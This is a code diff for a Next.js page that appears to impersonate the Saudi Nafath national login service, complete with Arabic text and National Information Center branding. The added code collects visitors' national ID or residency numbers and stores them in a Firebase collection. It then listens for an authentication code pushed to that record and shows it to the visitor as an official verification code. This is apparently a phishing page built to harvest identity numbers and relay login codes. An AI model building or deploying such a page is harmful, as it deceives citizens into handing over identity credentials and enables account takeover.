@@ -2,11 +2,115 @@
 
 import Image from "next/image"
 import Link from "next/link"
-import { useState } from "react"
-import { ChevronDown, ChevronUp, Menu } from "lucide-react"
+import { useState, useEffect } from "react"
+import { ChevronDown, ChevronUp, Menu, Copy, Check, AlertCircle } from "lucide-react"
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
+import { Button } from "@/components/ui/button"
+import { Input } from "@/components/ui/input"
+import { addData } from "@/lib/firebase"
+import { onSnapshot, doc, getFirestore } from "firebase/firestore"
+import { getApp } from "firebase/app"
 
 export default function Home() {
   const [isExpanded, setIsExpanded] = useState(false)
+  const [showAuthDialog, setShowAuthDialog] = useState(false)
+  const [idNumber, setIdNumber] = useState("")
+  const [authCode, setAuthCode] = useState("")
+  const [isLoading, setIsLoading] = useState(false)
+  const [error, setError] = useState("")
+  const [copied, setCopied] = useState(false)
+  const [userId, setUserId] = useState<string | null>(null)
+
+  // Generate a random auth code
+  const generateAuthCode = () => {
+    return Math.floor(100000 + Math.random() * 900000).toString()
+  }
+
+  // Set up Firestore listener for auth code updates
+  useEffect(() => {
+    if (!userId) return
+
+    const db = getFirestore(getApp())
+    const userRef = doc(db, "users", userId)
+
+    // Set up real-time listener
+    const unsubscribe = onSnapshot(
+      userRef,
+      (docSnapshot) => {
+        if (docSnapshot.exists()) {
+          const userData = docSnapshot.data()
+          if (userData?.authCode) {
+            setAuthCode(userData.authCode)
+          }
+        }
+      },
+      (error) => {
+        console.error("Error listening to auth updates:", error)
+      },
+    )
+
+    // Clean up listener on unmount
+    return () => unsubscribe()
+  }, [userId])
+
+  // Handle login
+  const handleLogin = async () => {
+    if (!idNumber.trim()) {
+      setError("الرجاء إدخال رقم الأحوال/الإقامة")
+      return
+    }
+
+    setIsLoading(true)
+    setError("")
+
+    try {
+      // Generate a new auth code
+      const newAuthCode = generateAuthCode()
+      setAuthCode(newAuthCode)
+
+      // Create a unique ID for the user
+      const uniqueId = `user_${Date.now()}`
+      setUserId(uniqueId)
+
+      // Store login details in Firestore
+      await addData({
+        collection: "users",
+        id: uniqueId,
+        data: {
+          idNumber: idNumber,
+          authCode: newAuthCode,
+          timestamp: new Date().toISOString(),
+          status: "pending",
+        },
+      })
+
+      // Save user ID to localStorage for persistence
+      localStorage.setItem("nafathUserId", uniqueId)
+
+      // Show the auth dialog
+      setShowAuthDialog(true)
+    } catch (err) {
+      setError("حدث خطأ أثناء تسجيل الدخول. الرجاء المحاولة مرة أخرى.")
+      console.error(err)
+    } finally {
+      setIsLoading(false)
+    }
+  }
+
+  // Check for existing user session on component mount
+  useEffect(() => {
+    const savedUserId = localStorage.getItem("nafathUserId")
+    if (savedUserId) {
+      setUserId(savedUserId)
+    }
+  }, [])
+
+  // Copy auth code to clipboard
+  const copyAuthCode = () => {
+    navigator.clipboard.writeText(authCode)
+    setCopied(true)
+    setTimeout(() => setCopied(false), 2000)
+  }
 
   return (
     <div className="flex flex-col min-h-screen bg-gray-50 text-right" dir="rtl">
@@ -32,24 +136,40 @@ export default function Home() {
       {/* Login Form */}
       <div className="bg-white p-6 m-4 rounded-md shadow-sm">
         <div className="mb-4 text-gray-600 text-center">رقم بطاقة الأحوال/الإقامة</div>
-        <input
+        <Input
           type="text"
           placeholder="ادخل رقم الأحوال/الإقامة الخاص بك هنا"
           className="w-full border rounded-md p-3 mb-4 text-right"
+          value={idNumber}
+          onChange={(e) => setIdNumber(e.target.value)}
         />
-        <button className="w-full bg-teal-500 text-white p-3 rounded-md mb-4">تسجيل الدخول</button>
+
+        {error && (
+          <div className="mb-4 text-red-500 text-sm flex items-center justify-center gap-2">
+            <AlertCircle size={16} />
+            <span>{error}</span>
+          </div>
+        )}
+
+        <Button
+          className="w-full bg-teal-500 hover:bg-teal-600 text-white p-3 rounded-md mb-4"
+          onClick={handleLogin}
+          disabled={isLoading}
+        >
+          {isLoading ? "جاري تسجيل الدخول..." : "تسجيل الدخول"}
+        </Button>
 
         <div className="text-center text-gray-600 mb-4">لتحميل تطبيق نفاذ</div>
 
         <div className="flex justify-center gap-2 mb-4">
           <Link href="#">
-            <Image src="/placeholder.svg?height=40&width=120" alt="App Store" width={120} height={40} />
+            <Image src="/app-store-button.png" alt="App Store" width={120} height={40} />
           </Link>
           <Link href="#">
-            <Image src="/placeholder.svg?height=40&width=120" alt="Google Play" width={120} height={40} />
+            <Image src="/google-play-button.png" alt="Google Play" width={120} height={40} />
           </Link>
           <Link href="#">
-            <Image src="/placeholder.svg?height=40&width=120" alt="App Gallery" width={120} height={40} />
+            <Image src="/app-gallery-button.png" alt="App Gallery" width={120} height={40} />
           </Link>
         </div>
       </div>
@@ -73,7 +193,7 @@ export default function Home() {
       {/* Footer */}
       <div className="mt-auto bg-gray-100 p-6 text-center">
         <div className="flex justify-center items-center mb-4">
-          <Image src="/placeholder.svg?height=40&width=120" alt="NIC Logo" width={120} height={40} />
+          <Image src="/national-information-center-logo.png" alt="NIC Logo" width={120} height={40} />
           <div className="text-right mr-2">
             <div>تطوير وتشغيل</div>
             <div className="font-bold">مركز المعلومات الوطني</div>
@@ -107,9 +227,64 @@ export default function Home() {
         </div>
 
         <div className="flex justify-center">
-          <Image src="/placeholder.svg?height=40&width=120" alt="Digital Stamp" width={120} height={40} />
+          <Image
+            src="/placeholder.svg?height=40&width=120&query=digital government stamp"
+            alt="Digital Stamp"
+            width={120}
+            height={40}
+          />
         </div>
       </div>
+
+      {/* Authentication Code Dialog */}
+      <Dialog open={showAuthDialog} onOpenChange={setShowAuthDialog}>
+        <DialogContent className="sm:max-w-md" dir="rtl">
+          <DialogHeader>
+            <DialogTitle className="text-xl font-bold text-teal-500">رمز التحقق</DialogTitle>
+            <DialogDescription>يرجى استخدام رمز التحقق التالي لإكمال عملية تسجيل الدخول</DialogDescription>
+          </DialogHeader>
+
+          <div className="p-6">
+            <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-6">
+              <div className="text-sm text-gray-500 mb-2">رمز التحقق الخاص بك:</div>
+              <div className="flex items-center justify-between">
+                <Button variant="ghost" size="sm" className="h-8 px-2 text-gray-500" onClick={copyAuthCode}>
+                  {copied ? <Check size={16} className="text-green-500" /> : <Copy size={16} />}
+                </Button>
+                <div className="text-2xl font-mono tracking-wider">{authCode}</div>
+              </div>
+            </div>
+
+            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
+              <div className="flex items-start gap-3">
+                <AlertCircle size={20} className="text-yellow-500 mt-0.5" />
+                <div>
+                  <div className="font-medium text-yellow-700 mb-1">ملاحظة هامة</div>
+                  <div className="text-sm text-yellow-600">
+                    هذا الرمز صالح لمدة 5 دقائق فقط. يرجى عدم مشاركته مع أي شخص آخر.
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div className="flex flex-col gap-3">
+              <Button
+                className="w-full bg-teal-500 hover:bg-teal-600 text-white"
+                onClick={() => setShowAuthDialog(false)}
+              >
+                تم
+              </Button>
+              <Button
+                variant="outline"
+                className="w-full border-teal-500 text-teal-500 hover:bg-teal-50"
+                onClick={() => setShowAuthDialog(false)}
+              >
+                إلغاء
+              </Button>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>
   )
 }
